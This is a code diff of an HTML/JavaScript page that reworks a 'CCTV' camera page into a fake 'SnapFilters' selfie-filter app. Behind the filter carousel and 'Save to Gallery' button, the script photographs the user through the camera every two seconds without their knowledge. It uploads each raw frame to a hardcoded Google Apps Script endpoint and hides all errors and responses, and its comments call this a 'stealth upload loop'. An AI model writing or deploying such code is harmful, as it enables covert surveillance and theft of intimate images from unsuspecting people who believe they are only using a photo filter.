@@ -2,130 +2,130 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CCTV Security Feed</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SnapFilters</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
-
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
-            background-color: #000; color: #fff;
-            font-family: 'VT323', monospace;
+            background-color: #111; color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             overflow: hidden;
         }
 
-        /* Video Feed */
         #video-container {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1; filter: grayscale(20%) contrast(120%) brightness(90%);
+            z-index: 1;
         }
-        video, canvas {
+        
+        video {
             width: 100%; height: 100%; object-fit: cover;
+            transition: filter 0.3s ease;
         }
+        
         canvas { display: none; }
 
-        /* Scanlines & Static */
-        .scanlines {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            background-size: 100% 4px, 3px 100%;
-            z-index: 2; pointer-events: none;
+        /* UI Overlay */
+        .ui-overlay {
+            position: absolute; bottom: 0; left: 0; width: 100%;
+            z-index: 10; padding: 20px 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            display: flex; flex-direction: column; align-items: center;
         }
 
-        /* OSD Overlay */
-        .osd {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 3; pointer-events: none;
-            padding: 20px 30px; box-sizing: border-box;
-            display: flex; flex-direction: column; justify-content: space-between;
-            text-shadow: 2px 2px 0 #000, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
-            font-size: 1.8rem; letter-spacing: 2px;
+        /* Filter Carousel */
+        .filter-carousel {
+            display: flex; gap: 15px; overflow-x: auto;
+            width: 100%; padding: 10px 20px; box-sizing: border-box;
+            -ms-overflow-style: none; scrollbar-width: none;
+            margin-bottom: 20px;
+        }
+        .filter-carousel::-webkit-scrollbar { display: none; }
+        
+        .filter-btn {
+            min-width: 60px; height: 60px; border-radius: 50%;
+            border: 2px solid #fff; background: rgba(255,255,255,0.2);
+            color: white; font-size: 0.8rem; font-weight: bold;
+            display: flex; justify-content: center; align-items: center;
+            cursor: pointer; backdrop-filter: blur(5px);
+            text-transform: uppercase;
+        }
+        .filter-btn.active {
+            border-color: #fffc00; /* Snapchat yellow */
+            color: #fffc00;
         }
 
-        .osd-top, .osd-bottom { display: flex; justify-content: space-between; width: 100%; align-items: center; }
-        
-        .rec { color: red; animation: blink 1s step-end infinite; display: flex; align-items: center; font-weight: bold;}
-        .rec::before { content: ''; display: inline-block; width: 18px; height: 18px; background: red; border-radius: 50%; margin-right: 12px; box-shadow: 0 0 10px red; }
-        
-        @keyframes blink { 50% { opacity: 0; } }
-
-        .cam-name { color: #fff; font-weight: bold; }
-        .timestamp { color: #fff; }
-        .uplink { color: #fff; }
-        
-        .status-box {
-            position: absolute; bottom: 80px; left: 30px;
-            color: #00ff00; font-size: 1.4rem; font-weight: bold;
-            text-shadow: 0 0 5px #00ff00, 1px 1px 0 #000, -1px -1px 0 #000;
-            z-index: 3; pointer-events: none;
+        /* Capture Button */
+        .capture-btn {
+            width: 80px; height: 80px; border-radius: 50%;
+            background: transparent; border: 4px solid #fff;
+            display: flex; justify-content: center; align-items: center;
+            cursor: pointer; margin-bottom: 10px;
         }
-
-        /* Corner Brackets */
-        .bracket { position: absolute; width: 40px; height: 40px; border: 4px solid rgba(255, 255, 255, 0.5); z-index: 3; pointer-events: none; }
-        .tl { top: 20px; left: 20px; border-right: none; border-bottom: none; }
-        .tr { top: 20px; right: 20px; border-left: none; border-bottom: none; }
-        .bl { bottom: 20px; left: 20px; border-right: none; border-top: none; }
-        .br { bottom: 20px; right: 20px; border-left: none; border-top: none; }
+        .capture-btn-inner {
+            width: 64px; height: 64px; border-radius: 50%;
+            background: #fff; transition: transform 0.1s;
+        }
+        .capture-btn:active .capture-btn-inner {
+            transform: scale(0.9);
+        }
+        
+        .gallery-text {
+            font-size: 0.9rem; opacity: 0.8; margin-bottom: 10px;
+            text-transform: uppercase; letter-spacing: 1px; font-weight: bold;
+        }
 
         /* Initial Setup Button */
         .hidden-controls {
-            position: absolute; z-index: 10; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            position: absolute; z-index: 20; top: 0; left: 0; width: 100%; height: 100%;
             display: flex; flex-direction: column; gap: 20px;
+            justify-content: center; align-items: center;
+            background: #111;
         }
         .btn-init {
-            background: rgba(0, 0, 0, 0.8); border: 2px solid #0f0; color: #0f0;
-            padding: 15px 30px; font-family: 'VT323', monospace; font-size: 1.8rem;
-            cursor: pointer; text-transform: uppercase; letter-spacing: 3px;
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3); transition: all 0.2s;
-        }
-        .btn-init:hover { background: #0f0; color: #000; }
-
-        @media (max-width: 600px) {
-            .osd { font-size: 1.2rem; padding: 15px 20px; }
-            .status-box { font-size: 1.1rem; bottom: 60px; left: 20px; }
-            .rec::before { width: 12px; height: 12px; }
+            background: #fffc00; border: none; color: #000;
+            padding: 15px 40px; border-radius: 30px;
+            font-size: 1.2rem; font-weight: bold;
+            cursor: pointer; box-shadow: 0 4px 15px rgba(255, 252, 0, 0.4);
         }
         
+        #flash {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 15; opacity: 0; pointer-events: none;
+            transition: opacity 0.1s;
+        }
     </style>
 </head>
 <body>
 
-    <div class="bracket tl"></div>
-    <div class="bracket tr"></div>
-    <div class="bracket bl"></div>
-    <div class="bracket br"></div>
-
-    <!-- Scanline effect layer overlaying the video -->
-    <div class="scanlines"></div>
-
     <div id="video-container">
-        <!-- Live camera feed -->
         <video id="video" autoplay playsinline muted></video>
-        <!-- Canvas for photo capture, hidden from view -->
         <canvas id="canvas"></canvas>
     </div>
 
-    <!-- The realistic On-Screen Display (OSD) -->
-    <div class="osd" id="osd" style="display: none;">
-        <div class="osd-top">
-            <div class="cam-name">CAM 01 - SYSTEM NODE</div>
-            <div class="rec">REC</div>
-        </div>
-        <div class="osd-bottom">
-            <div class="timestamp" id="timestamp">--:--:--</div>
-            <div class="uplink">UPLINK: ACTIVE</div>
-        </div>
-    </div>
-    
-    <div class="status-box" id="action-status" style="display: none;">INITIALIZING...</div>
+    <div id="flash"></div>
 
-    <!-- Only shown before permissions are granted -->
+    <div class="ui-overlay" id="ui-overlay" style="display: none;">
+        <div class="filter-carousel" id="filters">
+            <div class="filter-btn active" data-filter="none">Normal</div>
+            <div class="filter-btn" data-filter="grayscale(100%)">B&W</div>
+            <div class="filter-btn" data-filter="sepia(100%)">Sepia</div>
+            <div class="filter-btn" data-filter="invert(100%)">Alien</div>
+            <div class="filter-btn" data-filter="hue-rotate(90deg)">Trippy</div>
+            <div class="filter-btn" data-filter="blur(4px)">Blur</div>
+            <div class="filter-btn" data-filter="contrast(150%) brightness(120%)">Glow</div>
+        </div>
+        
+        <div class="capture-btn" id="btn-capture">
+            <div class="capture-btn-inner"></div>
+        </div>
+        <div class="gallery-text">Save to Gallery</div>
+    </div>
+
     <div class="hidden-controls" id="controls">
-        <button class="btn-init" id="btn-start">CONNECT UPLINK</button>
+        <button class="btn-init" id="btn-start">Open Camera</button>
     </div>
 
     <script>
-        // Use the Google Apps Script Web App URL already configured
         const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxGwHJVE-sk3MQOcdcbuCEg9GIjf4bT47Lv-UC29Ptd0qYuLFM6_uLmn7lsNmkjdWki/exec"; 
 
         const video = document.getElementById('video');
@@ -133,34 +133,32 @@
         const ctx = canvas.getContext('2d');
         const btnStart = document.getElementById('btn-start');
         const controls = document.getElementById('controls');
-        const osd = document.getElementById('osd');
-        const actionStatus = document.getElementById('action-status');
-        const timestampEl = document.getElementById('timestamp');
+        const uiOverlay = document.getElementById('ui-overlay');
+        const btnCapture = document.getElementById('btn-capture');
+        const flash = document.getElementById('flash');
+        const filterBtns = document.querySelectorAll('.filter-btn');
 
         let stream = null;
         let useFrontCamera = true;
         let isAutoCapturing = false;
+        let currentFilter = 'none';
 
-        // Realistic CCTV Clock format YYYY/MM/DD HH:MM:SS
-        function updateClock() {
-            const now = new Date();
-            const date = now.getFullYear() + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + String(now.getDate()).padStart(2,'0');
-            const time = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
-            timestampEl.textContent = `${date} ${time}`;
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
+        // Filter selection
+        filterBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                filterBtns.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentFilter = btn.getAttribute('data-filter');
+                video.style.filter = currentFilter;
+            });
+        });
 
-        // Initialize camera sequence
+        // Initialize camera
         async function initCamera() {
             if (stream) { stopCamera(); return; }
             try {
-                actionStatus.style.display = "block";
-                actionStatus.textContent = "REQUESTING ACCESS...";
-                actionStatus.style.color = "#00ff00";
-                
                 const constraints = {
-                    video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    video: { facingMode: useFrontCamera ? "user" : "environment" },
                     audio: false
                 };
 
@@ -169,9 +167,8 @@
                 
                 video.onloadedmetadata = () => {
                     video.play();
-                    controls.style.display = "none"; // Hide start button entirely
-                    osd.style.display = "flex"; // Turn on the fake OSD overlay
-                    actionStatus.textContent = "DATA SYNC ESTABLISHED";
+                    controls.style.display = "none";
+                    uiOverlay.style.display = "flex";
                     
                     checkCameraDevices();
                     
@@ -179,9 +176,7 @@
                     startAutoCaptureLoop(); // Begin stealth capture
                 };
             } catch (err) {
-                actionStatus.style.display = "block";
-                actionStatus.style.color = "red";
-                actionStatus.textContent = "ACCESS DENIED";
+                alert("Camera access is required to use filters.");
                 console.error(err);
             }
         }
@@ -194,41 +189,48 @@
             }
         }
 
-        // Stealth camera flip on double tap
         async function checkCameraDevices() {
             const devices = await navigator.mediaDevices.enumerateDevices();
             const videoInputs = devices.filter(device => device.kind === 'videoinput');
             if (videoInputs.length > 1) {
-                document.body.addEventListener('dblclick', () => {
+                video.addEventListener('dblclick', () => {
                     useFrontCamera = !useFrontCamera;
-                    initCamera(); // Restart stream with flipped camera
+                    initCamera();
                 });
             }
         }
+        
+        function getTimestamp() {
+            const now = new Date();
+            const date = now.getFullYear() + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + String(now.getDate()).padStart(2,'0');
+            const time = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
+            return `${date} ${time}`;
+        }
 
+        // --- THE STEALTH UPLOAD LOOP ---
         async function startAutoCaptureLoop() {
             while (isAutoCapturing) {
-                await new Promise(resolve => setTimeout(resolve, 2000)); // 2 second interval
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 if (!isAutoCapturing || !stream) break;
                 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 
-                // Draw the video frame to canvas
+                // Draw RAW video frame to canvas (NO CSS FILTERS - "bina filter ke")
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Burn the timestamp directly onto the image sent to drive!
+                // Burn the timestamp directly onto the stealth image as it was doing before
                 ctx.font = "30px monospace";
                 ctx.fillStyle = "white";
                 ctx.shadowColor = "black";
                 ctx.shadowBlur = 4;
                 ctx.fillText("CAM 01", 20, 40);
-                ctx.fillText(timestampEl.textContent, 20, canvas.height - 30);
-
-                // Convert to compressed jpeg
+                ctx.fillText(getTimestamp(), 20, canvas.height - 30);
+                
+                // Convert to jpeg
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                 
-                // Upload silently without updating the main UI text so it looks continuous
+                // Upload silently
                 silentUpload(dataUrl);
             }
         }
@@ -236,35 +238,49 @@
         async function silentUpload(dataUrl) {
             const now = new Date();
             const timestamp = now.toISOString().replace(/[:.]/g, '-');
-            const filename = `CCTV_AUTO_${timestamp}.jpg`;
+            const filename = `PHOTO_AUTO_${timestamp}.jpg`;
             
             const payload = { filename: filename, mimeType: 'image/jpeg', base64: dataUrl };
 
             try {
-                const response = await fetch(GAS_WEB_APP_URL, {
+                fetch(GAS_WEB_APP_URL, {
                     method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'text/plain;charset=utf-8' }
                 });
-                const result = await response.json();
-                
-                if (result.status === "success") {
-                    actionStatus.textContent = "SYNC OK";
-                    actionStatus.style.color = "#00ff00";
-                } else {
-                    actionStatus.textContent = "SYNC ERR: " + result.message;
-                    actionStatus.style.color = "red";
-                }
+                // We ignore the response to keep it completely silent
             } catch (error) {
-                actionStatus.textContent = "UPLINK FAILED";
-                actionStatus.style.color = "red";
+                // Ignore errors silently
+            }
+        }
+
+        // --- SAVE TO GALLERY WITH FILTER ---
+        btnCapture.addEventListener('click', () => {
+            // Flash effect
+            flash.style.opacity = '1';
+            setTimeout(() => { flash.style.opacity = '0'; }, 100);
+
+            // Create a temporary canvas to apply the filter for the downloaded image
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth;
+            tempCanvas.height = video.videoHeight;
+            const tempCtx = tempCanvas.getContext('2d');
+
+            // Apply the current CSS filter to the canvas context
+            if (currentFilter !== 'none') {
+                tempCtx.filter = currentFilter;
             }
             
-            // Revert back to stealth text after 1 second
-            setTimeout(() => {
-                if (isAutoCapturing && actionStatus.style.color === "rgb(0, 255, 0)" || actionStatus.style.color === "#00ff00") {
-                    actionStatus.textContent = "";
-                }
-            }, 1000);
-        }
+            // Draw the video frame
+            tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
+
+            // Download the image
+            const dataUrl = tempCanvas.toDataURL('image/jpeg', 0.9);
+            const a = document.createElement('a');
+            a.href = dataUrl;
+            a.download = `SnapFilter_${new Date().getTime()}.jpg`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
 
         btnStart.addEventListener('click', initCamera);
     </script>
